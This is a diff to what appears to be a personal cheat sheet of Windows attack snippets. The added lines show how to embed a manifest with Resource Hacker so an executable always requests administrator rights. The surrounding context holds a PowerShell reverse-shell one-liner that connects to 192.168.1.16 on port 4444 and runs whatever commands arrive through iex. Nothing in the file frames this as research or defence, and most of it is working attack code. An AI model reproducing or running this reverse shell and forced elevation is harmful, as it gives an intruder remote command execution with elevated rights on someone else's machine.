@@ -14,6 +14,19 @@ CLS
     exit /b 1
 )
 ---------------------------------------------------------------------------------------------------------------
+To embed .mainfest in .exe to make it run as administrator with Resource Hacker :
+with Resource Hacker 
+<?xml version="1.0" encoding="UTF-8"?>
+<assembly xmlns="urn:schemas-microsoft-com:asm.v1" manifestVersion="1.0">
+  <trustInfo xmlns="urn:schemas-microsoft-com:asm.v2">
+    <security>
+      <requestedPrivileges>
+        <requestedExecutionLevel level="requireAdministrator" uiAccess="false"/>
+      </requestedPrivileges>
+    </security>
+  </trustInfo>
+</assembly>
+---------------------------------------------------------------------------------------------------------------
 obfuscated powershell 
 $C=new-object net.sockets.tcpclient('192.168.1.16',4444);$S=$C.GetStream();[byte[]]$B=0..65535|%{0};while(($I=$S.Read($B,0,$B.Length)) -ne 0){;$D=(new-object -typename System.Text.ASCIIEncoding).GetString($B,0,$I);$O=(iex $D 2>&1 | Out-String);$OB=$O+'PS '+(pwd).Path+'> ';$SB=([text.encoding]::ASCII).GetBytes($OB);$S.Write($SB,0,$SB.Length);$S.Flush()};$C.Close()
 ---------------------------------------------------------------------------------------------------------------
